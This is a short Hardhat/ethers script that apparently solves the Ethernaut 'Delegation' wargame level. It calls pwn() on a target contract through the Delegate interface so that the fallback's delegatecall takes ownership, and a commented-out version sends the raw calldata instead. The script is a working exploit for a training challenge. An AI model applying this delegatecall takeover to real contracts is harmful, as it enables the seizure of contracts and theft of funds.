import { ethers } from "hardhat";

async function main() {


    const delegationAddress = "0x4Ea158c56541885bac77055229A2fE694e9b0288"

    const signers = await ethers.getSigners();
    const signer = signers[0];
    console.log("Using signer with address:", await signer.getAddress());

     const delegationAttacker = await ethers.getContractAt("Delegate", delegationAddress, signer);

     const gasLimit = 1_000_000;
     const tx = await delegationAttacker.pwn({gasLimit});
    

    // const bInterface = new ethers.utils.Interface([ {
    //     "inputs": [],
    //     "name": "pwn",
    //     "outputs": [],
    //     "stateMutability": "nonpayable",
    //     "type": "function"
    //   }]);

    // const tx = await signer.sendTransaction({
    //     to: delegationAddress,
    //     data: bInterface.encodeFunctionData("pwn", []),
    // });

    console.log("Transaction hash:", tx.hash);

    const receipt = await tx.wait();
    console.log("receipt:", receipt);


}   

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
